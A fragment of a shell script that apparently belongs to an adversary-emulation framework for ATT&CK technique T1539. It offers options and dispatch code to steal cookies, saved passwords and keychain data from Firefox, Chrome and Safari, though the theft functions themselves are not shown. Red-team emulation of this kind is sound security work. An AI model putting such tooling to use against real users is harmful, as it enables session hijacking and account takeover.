#!/bin/sh
# POSIX-compliant
# Procedure Name: web_session_cookies
...
TTP_ID="T1539" #replace with you coresponding ttp_id
...
PROCEDURE_NAME="web_session_cookies"  # Set by build system from YAML procedure_name field
...
SCRIPT:
  --all                            Steal credentials from all supported browsers
  --firefox                        Steal Firefox cookies and saved passwords
  --chrome                         Steal Chrome credentials and session data
  --safari                         Steal Safari keychain credentials
...
if [ "$ALL" = true ]; then
    ...
    result=$(execute_function steal_firefox_cookies)
    raw_output="${raw_output}${result}"
    result=$(execute_function steal_chrome_credentials)
    raw_output="${raw_output}${result}"
    result=$(execute_function steal_safari_cookies)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --firefox
if [ "$FIREFOX" = true ]; then
    core_debug_print "Executing functions for --firefox"
    result=$(execute_function steal_firefox_cookies)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --chrome
if [ "$CHROME" = true ]; then
    core_debug_print "Executing functions for --chrome"
    result=$(execute_function steal_chrome_credentials)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --safari
if [ "$SAFARI" = true ]; then
    core_debug_print "Executing functions for --safari"
    result=$(execute_function steal_safari_cookies)
    raw_output="${raw_output}${result}"
fi

# Set procedure name for processing
procedure="web_session_cookies"
